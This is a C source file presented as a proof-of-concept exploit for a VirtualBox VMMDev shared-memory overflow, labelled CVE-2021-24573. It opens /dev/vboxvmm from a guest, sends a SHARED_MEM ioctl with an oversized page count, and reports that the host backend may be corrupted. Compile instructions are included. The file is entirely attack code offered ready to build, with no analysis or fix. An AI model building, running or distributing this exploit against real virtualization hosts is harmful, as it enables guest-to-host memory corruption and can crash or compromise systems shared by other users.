/*
 * PoC for VirtualBox VMMDev shared‐memory overflow (CVE-2021-24573)
 *
 * Opens /dev/vboxvmm and issues SHARED_MEM ioctl with an
 * oversized pageCount, overflowing host VMMDev backend.
 *
 * Compile: gcc -Wall -O2 -o poc_vbox_shmem poc_vbox_shmem.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>

#define VMMDEV_IOCTL_MAGIC      'V'
#define VMMDEV_IOCTL_SHARED_MEM _IOWR(VMMDEV_IOCTL_MAGIC, 4, struct SharedMem)

struct SharedMem {
    uint64_t userAddress; /* guest pointer */
    uint32_t pageCount;   /* number of pages to map */
    uint32_t mapId;       /* returned ID */
};

int main() {
    int fd = open("/dev/vboxvmm", O_RDWR);
    if (fd < 0) { perror("open /dev/vboxvmm"); return 1; }

    struct SharedMem arg;
    arg.userAddress = 0;           /* NULL guest pointer is fine */
    arg.pageCount   = 0xFFFFFFFF;  /* overflow trigger */
    arg.mapId       = 0;

    printf("[+] Sending SHARED_MEM ioctl with pageCount=0x%x\n", arg.pageCount);
    if (ioctl(fd, VMMDEV_IOCTL_SHARED_MEM, &arg) < 0) {
        perror("ioctl SHARED_MEM");
    } else {
        printf("[+] ioctl returned, mapId=0x%x\n", arg.mapId);
        printf("[!] host VMMDev backend may be corrupted\n");
    }

    close(fd);
    return 0;
}